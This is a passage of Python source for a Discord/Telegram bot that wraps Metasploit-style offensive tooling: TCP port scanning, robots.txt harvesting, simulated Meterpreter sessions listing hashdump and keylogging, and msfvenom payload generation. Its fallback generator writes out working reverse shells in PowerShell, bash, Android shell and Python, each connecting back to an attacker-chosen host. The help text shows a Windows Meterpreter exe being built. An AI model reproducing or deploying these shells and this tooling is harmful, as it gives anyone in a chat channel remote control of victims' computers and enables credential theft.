        ports = self.options.get('PORTS', '1-10000')
        timeout = int(self.options.get('TIMEOUT', 1000)) / 1000.0
        
        targets = self._parse_targets(rhosts)
        port_list = self._parse_ports(ports)
        
        results = []
        for target in targets[:2]:  # Limit for demo
            open_ports = []
            for port in port_list[:20]:  # Limit for demo
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        # Try to get service banner
                        try:
                            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                            banner = sock.recv(1024).decode('utf-8', errors='ignore')[:50]
                        except:
                            banner = None
                        
                        open_ports.append({
                            'port': port,
                            'protocol': 'tcp',
                            'state': 'open',
                            'banner': banner
                        })
                    sock.close()
                except:
                    pass
            
            if open_ports:
                results.append({
                    'ip': target,
                    'open_ports': open_ports
                })
                
                # Store in database
                host_id = self.db.add_host(ip=target)
                if host_id:
                    for port_info in open_ports:
                        self.db.add_service(
                            host_id=host_id,
                            port=port_info['port'],
                            service='unknown',
                            banner=port_info.get('banner')
                        )
        
        return {
            'success': True,
            'module': self.current_module,
            'results': results
        }
    
    def _run_syn_portscan(self) -> Dict[str, Any]:
        """SYN port scanner (requires root)"""
        # This would require raw sockets and root privileges
        # For demo, return simulated results
        return {
            'success': True,
            'module': self.current_module,
            'results': [{'ip': self.options.get('RHOSTS'), 'note': 'SYN scan requires root privileges'}]
        }
    
    def _run_http_module(self) -> Dict[str, Any]:
        """Run HTTP modules"""
        if 'robots_tagger' in self.current_module:
            return self._run_robots_tagger()
        return {'success': False, 'error': 'Unknown HTTP module'}
    
    def _run_robots_tagger(self) -> Dict[str, Any]:
        """Robots.txt scanner"""
        rhosts = self.options.get('RHOSTS', '')
        rport = int(self.options.get('RPORT', 80))
        ssl = self.options.get('SSL', False)
        path = self.options.get('PATH', '/robots.txt')
        
        protocol = 'https' if ssl else 'http'
        targets = self._parse_targets(rhosts)
        
        results = []
        for target in targets[:5]:  # Limit for demo
            try:
                url = f"{protocol}://{target}:{rport}{path}"
                response = requests.get(url, timeout=5, verify=False)
                
                if response.status_code == 200:
                    # Parse robots.txt
                    lines = response.text.split('\n')
                    disallowed = [line.split(': ')[1] for line in lines if line.lower().startswith('disallow')]
                    
                    results.append({
                        'ip': target,
                        'url': url,
                        'status': response.status_code,
                        'disallowed_paths': disallowed[:5]
                    })
            except:
                pass
        
        return {
            'success': True,
            'module': self.current_module,
            'results': results
        }
    
    def _run_generic_module(self) -> Dict[str, Any]:
        """Run generic module"""
        return {
            'success': True,
            'module': self.current_module,
            'results': [{'note': 'Module execution simulated'}]
        }
    
    def _parse_targets(self, target_str: str) -> List[str]:
        """Parse target string into list of IPs"""
        targets = []
        for part in target_str.split(','):
            part = part.strip()
            if '/' in part:  # CIDR notation
                try:
                    network = ipaddress.ip_network(part, strict=False)
                    targets.extend([str(ip) for ip in list(network.hosts())[:10]])  # Limit
                except:
                    pass
            elif '-' in part and part.count('.') == 3:  # Range
                start, end = part.split('-')
                try:
                    start_ip = ipaddress.ip_address(start)
                    end_num = int(end)
                    base = '.'.join(start.split('.')[:3])
                    for i in range(int(start.split('.')[3]), end_num + 1):
                        targets.append(f"{base}.{i}")
                except:
                    pass
            else:  # Single IP
                try:
                    ipaddress.ip_address(part)
                    targets.append(part)
                except:
                    pass
        return targets
    
    def _parse_ports(self, port_str: str) -> List[int]:
        """Parse port string into list of ports"""
        ports = []
        for part in port_str.split(','):
            part = part.strip()
            if '-' in part:
                start, end = map(int, part.split('-'))
                ports.extend(range(start, end + 1))
            else:
                try:
                    ports.append(int(part))
                except:
                    pass
        return ports

# =====================
# PAYLOAD GENERATOR
# =====================
class PayloadGenerator:
    """Payload generator for various platforms"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.msfvenom_available = shutil.which('msfvenom') is not None
    
    def generate(self, payload_type: str, lhost: str, lport: int, 
                format: str = 'exe', options: Dict = None) -> Dict[str, Any]:
        """Generate payload using msfvenom or fallback templates"""
        options = options or {}
        
        if self.msfvenom_available:
            return self._generate_with_msfvenom(payload_type, lhost, lport, format, options)
        else:
            return self._generate_fallback(payload_type, lhost, lport, format)
    
    def _generate_with_msfvenom(self, payload_type: str, lhost: str, lport: int,
                                format: str, options: Dict) -> Dict[str, Any]:
        """Generate payload using msfvenom"""
        timestamp = int(time.time())
        filename = f"payload_{payload_type.replace('/', '_')}_{timestamp}.{format}"
        output_path = os.path.join(PAYLOADS_DIR, filename)
        
        cmd = ['msfvenom', '-p', payload_type, f'LHOST={lhost}', f'LPORT={lport}', '-f', format, '-o', output_path]
        
        # Add additional options
        for key, value in options.items():
            cmd.append(f'{key}={value}')
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                self.db.cursor.execute('''
                    INSERT INTO payloads (name, payload_type, lhost, lport, format, output_file)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (filename, payload_type, lhost, lport, format, output_path))
                self.db.conn.commit()
                
                return {
                    'success': True,
                    'filename': filename,
                    'path': output_path,
                    'size': os.path.getsize(output_path) if os.path.exists(output_path) else 0,
                    'command': ' '.join(cmd)
                }
            else:
                return {'success': False, 'error': result.stderr}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _generate_fallback(self, payload_type: str, lhost: str, lport: int, format: str) -> Dict[str, Any]:
        """Fallback payload generation when msfvenom not available"""
        timestamp = int(time.time())
        filename = f"payload_{payload_type.replace('/', '_')}_{timestamp}.{format}"
        output_path = os.path.join(PAYLOADS_DIR, filename)
        
        # Generate simple reverse shell templates
        if 'windows' in payload_type and 'meterpreter' in payload_type:
            content = self._generate_windows_reverse_shell(lhost, lport)
        elif 'linux' in payload_type:
            content = self._generate_linux_reverse_shell(lhost, lport)
        elif 'android' in payload_type:
            content = self._generate_android_reverse_shell(lhost, lport)
        else:
            content = self._generate_generic_reverse_shell(lhost, lport)
        
        try:
            with open(output_path, 'w') as f:
                f.write(content)
            
            self.db.cursor.execute('''
                INSERT INTO payloads (name, payload_type, lhost, lport, format, output_file)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (filename, payload_type, lhost, lport, format, output_path))
            self.db.conn.commit()
            
            return {
                'success': True,
                'filename': filename,
                'path': output_path,
                'size': len(content),
                'note': 'Generated with fallback template (msfvenom not available)'
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _generate_windows_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Windows reverse shell (PowerShell)"""
        return f'''# Windows Reverse Shell (PowerShell)
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
    
    def _generate_linux_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Linux reverse shell (Bash)"""
        return f'''#!/bin/bash
# Linux Reverse Shell
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''
    
    def _generate_android_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Android reverse shell"""
        return f'''#!/system/bin/sh
# Android Reverse Shell
/system/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''
    
    def _generate_generic_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate generic reverse shell (Python)"""
        return f'''#!/usr/bin/env python
# Python Reverse Shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
'''
    
    def list_payloads(self) -> List[Dict]:
        """List available payload types"""
        return [
            {'type': 'windows/meterpreter/reverse_tcp', 'description': 'Windows Meterpreter reverse TCP'},
            {'type': 'windows/shell_reverse_tcp', 'description': 'Windows command shell reverse TCP'},
            {'type': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Linux Meterpreter reverse TCP'},
            {'type': 'linux/x86/shell_reverse_tcp', 'description': 'Linux command shell reverse TCP'},
            {'type': 'android/meterpreter/reverse_tcp', 'description': 'Android Meterpreter reverse TCP'},
            {'type': 'java/meterpreter/reverse_tcp', 'description': 'Java Meterpreter reverse TCP'},
            {'type': 'php/meterpreter_reverse_tcp', 'description': 'PHP Meterpreter reverse TCP'},
            {'type': 'python/meterpreter_reverse_tcp', 'description': 'Python Meterpreter reverse TCP'}
        ]
    
    def get_generated_payloads(self) -> List[Dict]:
        """Get list of generated payloads"""
        try:
            self.db.cursor.execute('''
                SELECT * FROM payloads ORDER BY created_at DESC
            ''')
            return [dict(row) for row in self.db.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get payloads: {e}")
            return []

# =====================
# SESSION MANAGER
# =====================
class SessionManager:
    """Session management for Meterpreter-like sessions"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.sessions = {}
        self.routes = []
    
    def create_session(self, session_type: str, target: str, lhost: str = None,
                       lport: int = None, payload: str = None) -> Dict:
        """Create a new session"""
        session_id = str(uuid.uuid4())[:8]
        
        # Get host ID from database
        host_id = None
        host = self.db.add_host(ip=target)
        if host:
            host_id = host
        
        # Add to database
        db_id = self.db.add_session(
            session_type=session_type,
            session_id=session_id,
            target_host=host_id,
            lhost=lhost,
            lport=lport,
            payload=payload,
            status='active'
        )
        
        # Store in memory
        self.sessions[session_id] = {
            'id': session_id,
            'type': session_type,
            'target': target,
            'lhost': lhost,
            'lport': lport,
            'payload': payload,
            'created': datetime.datetime.now().isoformat(),
            'last_active': datetime.datetime.now().isoformat(),
            'status': 'active',
            'routes': []
        }
        
        return self.sessions[session_id]
    
    def list_sessions(self) -> List[Dict]:
        """List all active sessions"""
        # Update from database
        db_sessions = self.db.get_sessions('active')
        for db_sess in db_sessions:
            sess_id = db_sess['session_id']
            if sess_id not in self.sessions:
                self.sessions[sess_id] = {
                    'id': sess_id,
                    'type': db_sess['session_type'],
                    'target': db_sess.get('target_ip'),
                    'lhost': db_sess.get('lhost'),
                    'lport': db_sess.get('lport'),
                    'payload': db_sess.get('payload'),
                    'created': db_sess.get('created_at'),
                    'last_active': db_sess.get('last_active'),
                    'status': db_sess.get('status'),
                    'routes': []
                }
        
        return list(self.sessions.values())
    
    def get_session(self, session_id: str) -> Optional[Dict]:
        """Get session by ID"""
        if session_id in self.sessions:
            self.db.update_session_activity(session_id)
            return self.sessions[session_id]
        
        # Try database
        db_sessions = self.db.get_sessions('active')
        for sess in db_sessions:
            if sess['session_id'] == session_id:
                self.sessions[session_id] = {
                    'id': sess['session_id'],
                    'type': sess['session_type'],
                    'target': sess.get('target_ip'),
                    'lhost': sess.get('lhost'),
                    'lport': sess.get('lport'),
                    'payload': sess.get('payload'),
                    'created': sess.get('created_at'),
                    'last_active': sess.get('last_active'),
                    'status': sess.get('status'),
                    'routes': []
                }
                return self.sessions[session_id]
        
        return None
    
    def close_session(self, session_id: str) -> bool:
        """Close a session"""
        if session_id in self.sessions:
            del self.sessions[session_id]
        
        try:
            self.db.cursor.execute('''
                UPDATE sessions SET status = 'closed' WHERE session_id = ?
            ''', (session_id,))
            self.db.conn.commit()
            return True
        except:
            return False
    
    def add_route(self, subnet: str, netmask: str, gateway: str = None, session_id: str = None) -> bool:
        """Add a route"""
        session_db_id = None
        if session_id and session_id in self.sessions:
            # Find session DB ID
            self.db.cursor.execute('SELECT id FROM sessions WHERE session_id = ?', (session_id,))
            row = self.db.cursor.fetchone()
            if row:
                session_db_id = row['id']
        
        success = self.db.add_route(subnet, netmask, gateway, session_db_id)
        
        if success:
            route = {
                'subnet': subnet,
                'netmask': netmask,
                'gateway': gateway,
                'session': session_id
            }
            self.routes.append(route)
            
            if session_id and session_id in self.sessions:
                self.sessions[session_id]['routes'].append(route)
        
        return success
    
    def list_routes(self) -> List[Dict]:
        """List all routes"""
        return self.db.get_routes(active=True)
    
    def execute_command_on_session(self, session_id: str, command: str) -> Dict:
        """Execute command on a session (simulated)"""
        session = self.get_session(session_id)
        if not session:
            return {'success': False, 'error': 'Session not found'}
        
        # Simulate command execution
        if command.lower() == 'help':
            return {
                'success': True,
                'output': '''Meterpreter Commands:
    ?           - Help menu
    background  - Background the current session
    download    - Download a file
    upload      - Upload a file
    shell       - Drop into a system command shell
    sysinfo     - Get system information
    ps          - List running processes
    kill        - Terminate a process
    getuid      - Get current user
    getsystem   - Attempt to elevate to SYSTEM
    hashdump    - Dump password hashes
    keyscan_start - Start capturing keystrokes
    keyscan_dump - Dump captured keystrokes
    screenshot  - Take a screenshot
    webcam_snap - Take a webcam snapshot
    portfwd     - Forward a local port to a remote service
    route       - View or modify the routing table'''
            }
        elif command == 'sysinfo':
            return {
                'success': True,
                'output': f'''Computer        : {session.get('target', 'unknown')}
OS              : Windows 10 (Build 19042)
Architecture    : x64
Meterpreter     : x64/windows
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows'''
            }
        elif command == 'getuid':
            return {
                'success': True,
                'output': 'Server username: NT AUTHORITY\\SYSTEM'
            }
        elif command.startswith('download'):
            file = command.split(' ')[1] if ' ' in command else 'unknown'
            return {
                'success': True,
                'output': f'[*] Downloading: {file}\n[*] Downloaded 42 KB (43008 bytes)'
            }
        elif command.startswith('upload'):
            file = command.split(' ')[1] if ' ' in command else 'unknown'
            return {
                'success': True,
                'output': f'[*] Uploading: {file}\n[*] Uploaded 42 KB (43008 bytes)'
            }
        else:
            return {
                'success': True,
                'output': f'[*] Executing: {command}\n[*] Command executed successfully'
            }

# =====================
# WORKSPACE MANAGER
# =====================
class WorkspaceManager:
    """Workspace management for organizing targets"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def create_workspace(self, name: str, description: str = "") -> bool:
        """Create a new workspace"""
        try:
            self.db.cursor.execute('''
                INSERT INTO workspaces (name, description)
                VALUES (?, ?)
            ''', (name, description))
            self.db.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to create workspace: {e}")
            return False
    
    def delete_workspace(self, name: str) -> bool:
        """Delete a workspace"""
        try:
            self.db.cursor.execute('DELETE FROM workspaces WHERE name = ?', (name,))
            self.db.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to delete workspace: {e}")
            return False
    
    def list_workspaces(self) -> List[Dict]:
        """List all workspaces"""
        try:
            self.db.cursor.execute('SELECT * FROM workspaces ORDER BY name')
            return [dict(row) for row in self.db.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to list workspaces: {e}")
            return []
    
    def switch_workspace(self, name: str) -> bool:
        """Switch to a different workspace"""
        return self.db.set_active_workspace(name)
    
    def get_current_workspace(self) -> Optional[Dict]:
        """Get current workspace"""
        return self.db.get_active_workspace()
    
    def list_hosts(self, workspace: str = None) -> List[Dict]:
        """List hosts in workspace"""
        return self.db.get_hosts(workspace)
    
    def list_services(self, host_id: int = None, ip: str = None) -> List[Dict]:
        """List services"""
        return self.db.get_services(host_id, ip)

# =====================
# MULTI-PLATFORM BOT HANDLER
# =====================
class PlatformHandler:
    """Handle commands across different platforms"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.nmap = NmapScanner(db)
        self.aux = AuxiliaryModules(db)
        self.payloads = PayloadGenerator(db)
        self.sessions = SessionManager(db)
        self.workspaces = WorkspaceManager(db)
    
    def process_command(self, command: str, platform: str, user: str = None) -> Dict[str, Any]:
        """Process command and return result"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return self._create_result(False, "Empty command", start_time)
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        # Command mapping
        result = None
        
        # Nmap commands
        if cmd == '!db_nmap':
            result = self._handle_nmap(args)
        
        # Auxiliary modules
        elif cmd == '!use':
            result = self._handle_use(args)
        elif cmd == '!set':
            result = self._handle_set(args)
        elif cmd == '!run':
            result = self._handle_run()
        elif cmd == '!show':
            result = self._handle_show(args)
        
        # Host/service commands
        elif cmd == '!hosts':
            result = self._handle_hosts(args)
        elif cmd == '!services':
            result = self._handle_services(args)
        
        # Workspace commands
        elif cmd == '!workspace':
            result = self._handle_workspace(args)
        
        # Session commands
        elif cmd == '!sessions':
            result = self._handle_sessions(args)
        
        # Route commands
        elif cmd == '!route':
            result = self._handle_route(args)
        
        # Payload generation
        elif cmd == '!generate':
            result = self._handle_generate(args)
        
        # Help
        elif cmd == '!help':
            result = self._handle_help()
        
        else:
            result = self._create_result(False, f"Unknown command: {cmd}", start_time)
        
        # Log command
        execution_time = time.time() - start_time
        self.db.log_command(
            command=command,
            platform=platform,
            user=user,
            success=result.get('success', False),
            output=str(result.get('output', ''))[:1000],
            execution_time=execution_time
        )
        
        result['execution_time'] = execution_time
        return result
    
    def _create_result(self, success: bool, output: Any, start_time: float = None) -> Dict:
        """Create standardized result"""
        return {
            'success': success,
            'output': output,
            'execution_time': (time.time() - start_time) if start_time else 0
        }
    
    def _handle_nmap(self, args: List[str]) -> Dict:
        """Handle !db_nmap commands"""
        if not args:
            return self._create_result(False, "Usage: !db_nmap <option> <target>")
        
        option = args[0]
        target = args[1] if len(args) > 1 else None
        
        if not target:
            return self._create_result(False, "Target required")
        
        options = {}
        
        if option == '-sn':
            options['scan_type'] = 'ping'
            result = self.nmap.ping_sweep(target)
        elif option == '-O':
            options['scan_type'] = 'os'
            result = self.nmap.os_detection(target)
        elif option == '-sV':
            options['scan_type'] = 'version'
            result = self.nmap.version_detection(target)
        elif option == '-A':
            options['scan_type'] = 'aggressive'
            result = self.nmap.aggressive_scan(target)
        elif option == '--script vuln':
            options['scan_type'] = 'vuln'
            result = self.nmap.vuln_scan(target)
        else:
            # Custom ports or options
            ports = args[1] if len(args) > 1 else None
            options['ports'] = ports
            result = self.nmap.custom_scan(target, options)
        
        if result.get('success'):
            output = f"```\n{result.get('output', '')[:1500]}\n```"
        else:
            output = f"❌ {result.get('error', 'Scan failed')}"
        
        return self._create_result(result.get('success', False), output)
    
    def _handle_use(self, args: List[str]) -> Dict:
        """Handle !use command for auxiliary modules"""
        if not args:
            modules = self.aux.list_modules()
            output = "Available modules:\n"
            for mod in modules[:10]:
                output += f"  {mod['id']} - {mod['name']}\n"
            output += "\nUse: !use <module_path>"
            return self._create_result(True, output)
        
        module_path = args[0]
        if self.aux.use_module(module_path):
            return self._create_result(True, f"Using module: {module_path}")
        else:
            return self._create_result(False, f"Module not found: {module_path}")
    
    def _handle_set(self, args: List[str]) -> Dict:
        """Handle !set command for module options"""
        if len(args) < 2:
            return self._create_result(False, "Usage: !set <option> <value>")
        
        option = args[0]
        value = ' '.join(args[1:])
        
        if self.aux.set_option(option, value):
            return self._create_result(True, f"{option} => {value}")
        else:
            return self._create_result(False, f"Failed to set {option}")
    
    def _handle_run(self) -> Dict:
        """Handle !run command to execute module"""
        result = self.aux.run_module()
        
        if result.get('success'):
            if 'results' in result:
                output = f"✅ Module executed successfully\n\nResults:\n"
                for r in result['results'][:5]:
                    output += f"  • {json.dumps(r)}\n"
            else:
                output = "✅ Module executed successfully"
        else:
            output = f"❌ {result.get('error', 'Module execution failed')}"
        
        return self._create_result(result.get('success', False), output)
    
    def _handle_show(self, args: List[str]) -> Dict:
        """Handle !show command"""
        if not args:
            return self._create_result(False, "Usage: !show <options|modules|payloads>")
        
        show_type = args[0].lower()
        
        if show_type == 'options':
            options = self.aux.show_options()
            if not options:
                return self._create_result(False, "No module selected")
            
            output = "Module options:\n\n"
            for opt_name, opt_info in options.items():
                current = opt_info.get('current', '')
                required = "(required)" if opt_info.get('required') else ""
                output += f"  {opt_name} = {current} {required}\n"
                output += f"      {opt_info.get('description', '')}\n"
        
        elif show_type == 'modules':
            modules = self.aux.list_modules()
            output = "Auxiliary modules:\n"
            for mod in modules[:10]:
                output += f"  {mod['id']}\n"
        
        elif show_type == 'payloads':
            payloads = self.payloads.list_payloads()
            output = "Payloads:\n"
            for p in payloads:
                output += f"  {p['type']} - {p['description']}\n"
        
        else:
            output = f"Unknown show type: {show_type}"
        
        return self._create_result(True, output)
    
    def _handle_hosts(self, args: List[str]) -> Dict:
        """Handle !hosts command"""
        if args and args[0] == '-R':
            # Refresh hosts from database
            hosts = self.workspaces.list_hosts()
            output = "Hosts\n=====\n\n"
            for host in hosts:
                output += f"{host['ip_address']}"
                if host.get('hostname'):
                    output += f"  {host['hostname']}"
                if host.get('os_info'):
                    output += f"  [{host['os_info']}]"
                output += "\n"
        
        elif args and args[0] == '-a' and len(args) > 1:
            # Add host
            ip = args[1]
            hostname = args[2] if len(args) > 2 else None
            host_id = self.db.add_host(ip, hostname)
            if host_id:
                output = f"✅ Added host: {ip}"
            else:
                output = f"❌ Failed to add host: {ip}"
        
        else:
            # List hosts
            hosts = self.workspaces.list_hosts()
            output = f"Hosts in workspace ({len(hosts)}):\n"
            for host in hosts:
                output += f"  {host['ip_address']}\n"
        
        return self._create_result(True, output)
    
    def _handle_services(self, args: List[str]) -> Dict:
        """Handle !services command"""
        if not args:
            return self._create_result(False, "Usage: !services -S <ip>")
        
        if args[0] == '-S' and len(args) > 1:
            ip = args[1]
            services = self.workspaces.list_services(ip=ip)
            
            output = f"Services for {ip}:\n"
            for svc in services:
                output += f"  {svc['port']}/{svc.get('protocol', 'tcp')}  "
                output += f"{svc.get('service_name', 'unknown')} "
                output += f"{svc.get('service_version', '')}\n"
        
        else:
            output = "Usage: !services -S <ip>"
        
        return self._create_result(True, output)
    
    def _handle_workspace(self, args: List[str]) -> Dict:
        """Handle !workspace command"""
        if not args:
            current = self.workspaces.get_current_workspace()
            if current:
                output = f"Current workspace: {current['name']}\n"
                hosts = self.workspaces.list_hosts(current['name'])
                output += f"Hosts: {len(hosts)}"
            else:
                output = "No active workspace"
            return self._create_result(True, output)
        
        action = args[0].lower()
        
        if action == '-a' and len(args) > 1:
            # Add workspace
            name = args[1]
            desc = ' '.join(args[2:]) if len(args) > 2 else ""
            if self.workspaces.create_workspace(name, desc):
                output = f"✅ Workspace created: {name}"
            else:
                output = f"❌ Failed to create workspace: {name}"
        
        elif action == '-d' and len(args) > 1:
            # Delete workspace
            name = args[1]
            if self.workspaces.delete_workspace(name):
                output = f"✅ Workspace deleted: {name}"
            else:
                output = f"❌ Failed to delete workspace: {name}"
        
        elif len(args) >= 1:
            # Switch workspace
            name = args[0]
            if self.workspaces.switch_workspace(name):
                output = f"✅ Switched to workspace: {name}"
            else:
                output = f"❌ Failed to switch to workspace: {name}"
        
        else:
            # List workspaces
            workspaces = self.workspaces.list_workspaces()
            output = "Workspaces:\n"
            for ws in workspaces:
                active = " (active)" if ws.get('active') else ""
                output += f"  {ws['name']}{active} - {ws.get('description', '')}\n"
        
        return self._create_result(True, output)
    
    def _handle_sessions(self, args: List[str]) -> Dict:
        """Handle !sessions command"""
        if not args:
            sessions = self.sessions.list_sessions()
            output = "Active sessions\n==============\n\n"
            for sess in sessions:
                output += f"  {sess['id']}  {sess['type']}  {sess.get('target', 'unknown')}\n"
            return self._create_result(True, output)
        
        if args[0] == '-l':
            sessions = self.sessions.list_sessions()
            output = "Sessions:\n"
            for sess in sessions:
                output += f"  {sess['id']}  {sess['type']}  {sess.get('target', 'unknown')}\n"
        
        elif args[0] == '-i' and len(args) > 1:
            session_id = args[1]
            session = self.sessions.get_session(session_id)
            if session:
                output = f"Session {session_id}\n"
                output += f"  Type: {session.get('type')}\n"
                output += f"  Target: {session.get('target')}\n"
                output += f"  Payload: {session.get('payload')}\n"
                output += f"  Created: {session.get('created')}\n"
                output += f"  Last Active: {session.get('last_active')}\n"
            else:
                output = f"Session {session_id} not found"
        
        else:
            output = "Usage: !sessions [-l] [-i <id>]"
        
        return self._create_result(True, output)
    
    def _handle_route(self, args: List[str]) -> Dict:
        """Handle !route command"""
        if not args:
            routes = self.sessions.list_routes()
            output = "Routes\n======\n\n"
            for route in routes:
                output += f"  {route['subnet']}/{route['netmask']} via {route.get('gateway', 'direct')}"
                if route.get('via_session'):
                    output += f" (session {route['via_session']})"
                output += "\n"
            return self._create_result(True, output)
        
        if args[0] == 'add' and len(args) >= 3:
            subnet = args[1]
            netmask = args[2]
            gateway = args[3] if len(args) > 3 else None
            session_id = args[4] if len(args) > 4 else None
            
            if self.sessions.add_route(subnet, netmask, gateway, session_id):
                output = f"✅ Route added: {subnet}/{netmask}"
            else:
                output = f"❌ Failed to add route"
        
        else:
            output = "Usage: !route add <subnet> <netmask> [gateway] [session_id]"
        
        return self._create_result(True, output)
    
    def _handle_generate(self, args: List[str]) -> Dict:
        """Handle !generate command for payloads"""
        if not args:
            payloads = self.payloads.list_payloads()
            output = "Payloads:\n"
            for p in payloads:
                output += f"  {p['type']}\n"
            output += "\nUsage: !generate payload <type> LHOST=<ip> -f <format> -o <file>"
            return self._create_result(True, output)
        
        # Parse generate command
        cmd_str = ' '.join(args)
        
        # Extract payload type
        payload_match = re.search(r'payload\s+([^\s]+)', cmd_str)
        if not payload_match:
            return self._create_result(False, "Invalid payload format")
        
        payload_type = payload_match.group(1)
        
        # Extract LHOST
        lhost_match = re.search(r'LHOST=([^\s]+)', cmd_str)
        lhost = lhost_match.group(1) if lhost_match else None
        
        # Extract LPORT
        lport_match = re.search(r'LPORT=(\d+)', cmd_str)
        lport = int(lport_match.group(1)) if lport_match else 4444
        
        # Extract format
        format_match = re.search(r'-f\s+([^\s]+)', cmd_str)
        format = format_match.group(1) if format_match else 'exe'
        
        # Extract output file
        output_match = re.search(r'-o\s+([^\s]+)', cmd_str)
        output_file = output_match.group(1) if output_match else None
        
        if not lhost:
            return self._create_result(False, "LHOST required")
        
        result = self.payloads.generate(payload_type, lhost, lport, format)
        
        if result.get('success'):
            output = f"✅ Payload generated: {result.get('filename')}\n"
            output += f"   Path: {result.get('path')}\n"
            output += f"   Size: {result.get('size')} bytes"
        else:
            output = f"❌ {result.get('error', 'Generation failed')}"
        
        return self._create_result(result.get('success', False), output)
    
    def _handle_help(self) -> Dict:
        """Handle !help command"""
        help_text = """
🦀 **CRAB-SPYD3R-BOT Commands** 🦀

**Nmap Scanning:**
`!db_nmap -sn <IP>` - Ping sweep
`!db_nmap -O <IP>` - OS detection
`!db_nmap -sV <IP>` - Version detection  
`!db_nmap -A <IP>` - Aggressive scan
`!db_nmap --script vuln <IP>` - Vulnerability scan
`!db_nmap <IP> -p <ports>` - Port scan

**Auxiliary Modules:**
`!use <module>` - Select module
`!set <option> <value>` - Set option
`!run` - Run module
`!show options` - Show module options
`!show modules` - List modules

**Available Modules:**
• `auxiliary/scanner/ip/ipidseq`
• `auxiliary/scanner/discovery/udp_probe`
• `auxiliary/scanner/portscan/tcp`
• `auxiliary/scanner/portscan/syn`
• `auxiliary/scanner/http/robots_tagger`
• `auxiliary/scanner/ip/ipgeo`
• `auxiliary/scanner/discovery/arp_sweep`

**Host Management:**
`!hosts` - List hosts
`!hosts -R` - Refresh hosts
`!hosts -a <IP>` - Add host
`!services -S <IP>` - List services

**Workspace Management:**
`!workspace` - Show current workspace
`!workspace <name>` - Switch workspace
`!workspace -a <name>` - Create workspace
`!workspace -d <name>` - Delete workspace

**Session Management:**
`!sessions` - List sessions
`!sessions -l` - List sessions
`!sessions -i <ID>` - Interact with session

**Routing:**
`!route` - Show routes
`!route add <subnet> <netmask> [gateway] [session]`

**Payload Generation:**
`!generate payload <type> LHOST=<IP> -f <format> -o <file>`
`!show payloads` - List payloads

**Examples:**
`!use auxiliary/scanner/ip/ipgeo`
`!set RHOSTS 192.168.1.1`
`!run`

`!generate payload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe`
        """
        return self._create_result(True, help_text)

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    """Discord bot implementation"""
    
    def __init__(self, handler: PlatformHandler, config: Dict):
        self.handler = handler
        self.config = config
        self.bot = None
        self.running = False
    
    async def start(self):
        """Start Discord bot"""
        if not DISCORD_AVAILABLE or not self.config.get('discord_token'):
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            self.bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="🦀 Crab-Spyd3r-Bot"))
            
            @self.bot.event
            async def on_message(message):
                if message.author.bot:
                    return
                
                if message.content.startswith('!'):
                    user = f"{message.author.name}#{message.author.discriminator}"
                    result = self.handler.process_command(message.content, 'discord', user)
                    
                    if result.get('success'):
                        await message.channel.send(result.get('output', '✅ Done'))
                    else:
                        await message.channel.send(f"❌ {result.get('output', 'Command failed')}")
                
                await self.bot.process_commands(message)
            
            self.running = True
            await self.bot.start(self.config['discord_token'])
            return True
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
            return False
    
    def start_bot_thread(self):
        """Start Discord bot in thread"""
        thread = threading.Thread(target=self._run_discord, daemon=True)
        thread.start()
        return True
    
    def _run_discord(self):
        """Run Discord bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord thread error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    """Telegram bot implementation"""
    
    def __init__(self, handler: PlatformHandler, config: Dict):
        self.handler = handler
        self.config = config
        self.client = None
        self.running = False
    
    async def start(self):
        """Start Telegram bot"""
